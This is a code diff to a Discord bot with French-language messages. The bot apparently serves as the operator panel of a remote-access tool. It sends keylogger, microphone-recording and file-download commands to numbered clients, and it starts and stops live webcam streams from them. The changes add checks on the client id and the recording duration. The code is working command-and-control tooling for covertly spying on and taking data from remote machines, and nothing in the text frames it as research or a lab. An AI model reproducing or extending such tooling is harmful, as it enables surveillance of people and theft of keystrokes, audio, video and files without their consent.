@@ -1,7 +1,7 @@
 import {ActionRowBuilder, ButtonBuilder} from "discord.js";
 import {commands} from "../commands.js";
 import {executeRequestWithTokenRefresh} from "./token.js";
-import {createEmbed} from "./utils.js";
+import {createEmbed, isClientNumberValid} from "./utils.js";
 import config from "../static/config.json" assert {type: "json"};
 
 const {API_BASE_URL} = config;
@@ -56,51 +56,59 @@ export const handleSendCommand = async (interaction) => {
 
     await interaction.deferReply({ephemeral: true});
 
-    const url = `${API_BASE_URL}/command/${clientId}`;
-    let data = {
-        command: command,
-        user_id: user_id,
-    };
+    if (isClientNumberValid(clientId)) {
+        const url = `${API_BASE_URL}/command/${clientId}`;
+        let data = {
+            command: command,
+            user_id: user_id,
+        };
 
-    if ((command === 'microphone' || command === 'keylogger') && duration) {
-        data.params = {duration};
-    } else if ((command === 'microphone' || command === 'keylogger') && !duration) {
-        await interaction.editReply(`La durée est requise pour la commande '${command}'.`);
-        return;
-    }
-
-    if (command === 'downloadfile' && file_path) {
-        data.params = {file_path};
-    } else if (command === 'downloadfile' && !file_path) {
-        await interaction.editReply(`Le chemin du fichier est requis pour la commande '${command}'.`);
-        return;
-    }
-
-    try {
-        await executeRequestWithTokenRefresh(url, {method: 'POST', data});
-        if (command === 'microphone' || command === 'keylogger') {
-            const contentType = command === 'microphone' ? 'de l\'audio' : 'du clavier';
-            await interaction.editReply(`Démarrage de l'enregistrement ${contentType} pour le client ${clientId} pour ${duration} secondes...`);
-            let elapsedSeconds = 0;
-            const intervalId = setInterval(async () => {
-                elapsedSeconds++;
-                const percentage = Math.min((elapsedSeconds / duration) * 100, 100).toFixed(0);
-                await interaction.editReply(`Enregistrement en cours... ${percentage}% complété.`);
-                if (elapsedSeconds >= duration) {
-                    clearInterval(intervalId);
-                    await interaction.editReply(`Enregistrement terminé pour le client ${clientId}.`);
-                }
-            }, 1000);
-        } else {
-            await interaction.editReply(`Commande '${command}' envoyée au client ${clientId}.`);
+        if ((command === 'microphone' || command === 'keylogger') && duration) {
+            if(duration < 10 || duration > 600) {
+                await interaction.editReply(`La durée doit être comprise entre 10 et 600 secondes pour la commande '${command}'.`);
+                return;
+            }
+            data.params = {duration};
+        } else if ((command === 'microphone' || command === 'keylogger') && !duration) {
+            await interaction.editReply(`La durée est requise pour la commande '${command}'.`);
+            return;
         }
-    } catch (error) {
-        if (error.response.data.message.includes("hors ligne")) {
-            await interaction.editReply("Le client est hors ligne.");
-        } else {
-            console.error("Erreur lors de l'envoi de la commande", error);
-            await interaction.editReply("Erreur lors de l'envoi de la commande.");
+
+        if (command === 'downloadfile' && file_path) {
+            data.params = {file_path};
+        } else if (command === 'downloadfile' && !file_path) {
+            await interaction.editReply(`Le chemin du fichier est requis pour la commande '${command}'.`);
+            return;
         }
+
+        try {
+            await executeRequestWithTokenRefresh(url, {method: 'POST', data});
+            if (command === 'microphone' || command === 'keylogger') {
+                const contentType = command === 'microphone' ? 'de l\'audio' : 'du clavier';
+                await interaction.editReply(`Démarrage de l'enregistrement ${contentType} pour le client ${clientId} pour ${duration} secondes...`);
+                let elapsedSeconds = 0;
+                const intervalId = setInterval(async () => {
+                    elapsedSeconds++;
+                    const percentage = Math.min((elapsedSeconds / duration) * 100, 100).toFixed(0);
+                    await interaction.editReply(`Enregistrement en cours... ${percentage}% complété.`);
+                    if (elapsedSeconds >= duration) {
+                        clearInterval(intervalId);
+                        await interaction.editReply(`Enregistrement terminé pour le client ${clientId}.`);
+                    }
+                }, 1000);
+            } else {
+                await interaction.editReply(`Commande '${command}' envoyée au client ${clientId}.`);
+            }
+        } catch (error) {
+            if (error.response.data.message.includes("hors ligne")) {
+                await interaction.editReply("Le client est hors ligne.");
+            } else {
+                console.error("Erreur lors de l'envoi de la commande", error);
+                await interaction.editReply("Erreur lors de l'envoi de la commande.");
+            }
+        }
+    } else {
+        await interaction.editReply("L'identifiant du client doit être un nombre supérieur à 0.");
     }
 };
 
@@ -108,18 +116,22 @@ export const handleLivestreamCommand = async (interaction) => {
     const clientId = interaction.options.getString('client_id');
     await interaction.deferReply({ephemeral: true});
 
-    const url = `${API_BASE_URL}/webcam/link/${clientId}`;
-    const url_webcam = `${API_BASE_URL}/webcam/${clientId}`;
-    try {
-        await executeRequestWithTokenRefresh(url, {method: 'GET'});
-        await interaction.editReply(`Diffusion en direct de la webcam du client ${clientId} démarrée : ${url_webcam}`);
-    } catch (error) {
-        if (error.response.data.message.includes("hors ligne")) {
-            await interaction.editReply("Le client est hors ligne.");
-        } else {
-            console.error("Erreur lors du démarrage de la diffusion en direct : ", error.response.data.message);
-            await interaction.editReply(error.response.data.message);
+    if (isClientNumberValid(clientId)) {
+        const url = `${API_BASE_URL}/webcam/link/${clientId}`;
+        const url_webcam = `${API_BASE_URL}/webcam/${clientId}`;
+        try {
+            await executeRequestWithTokenRefresh(url, {method: 'GET'});
+            await interaction.editReply(`Diffusion en direct de la webcam du client ${clientId} démarrée : ${url_webcam}`);
+        } catch (error) {
+            if (error.response.data.message.includes("hors ligne")) {
+                await interaction.editReply("Le client est hors ligne.");
+            } else {
+                console.error("Erreur lors du démarrage de la diffusion en direct : ", error.response.data.message);
+                await interaction.editReply(error.response.data.message);
+            }
         }
+    } else {
+        await interaction.editReply("L'identifiant du client doit être un nombre supérieur à 0.");
     }
 }
 
@@ -127,17 +139,21 @@ export const handleStopLivestreamCommand = async (interaction) => {
     const clientId = interaction.options.getString('client_id');
     await interaction.deferReply({ephemeral: true});
 
-    const url = `${API_BASE_URL}/webcam/stop/${clientId}`;
-    try {
-        await executeRequestWithTokenRefresh(url, {method: 'GET'});
-        await interaction.editReply(`Diffusion en direct de la webcam du client ${clientId} arrêtée.`);
-    } catch (error) {
-        if (error.response.data.message.includes("hors ligne")) {
-            await interaction.editReply("Le client est hors ligne.");
-        } else {
-            console.error("Erreur lors de l'arrêt de la diffusion en direct : ", error.response.data.message);
-            await interaction.editReply(error.response.data.message);
+    if (isClientNumberValid(clientId)) {
+        const url = `${API_BASE_URL}/webcam/stop/${clientId}`;
+        try {
+            await executeRequestWithTokenRefresh(url, {method: 'GET'});
+            await interaction.editReply(`Diffusion en direct de la webcam du client ${clientId} arrêtée.`);
+        } catch (error) {
+            if (error.response.data.message.includes("hors ligne")) {
+                await interaction.editReply("Le client est hors ligne.");
+            } else {
+                console.error("Erreur lors de l'arrêt de la diffusion en direct : ", error.response.data.message);
+                await interaction.editReply(error.response.data.message);
+            }
         }
+    } else {
+        await interaction.editReply("L'identifiant du client doit être un nombre supérieur à 0.");
     }
 }
 
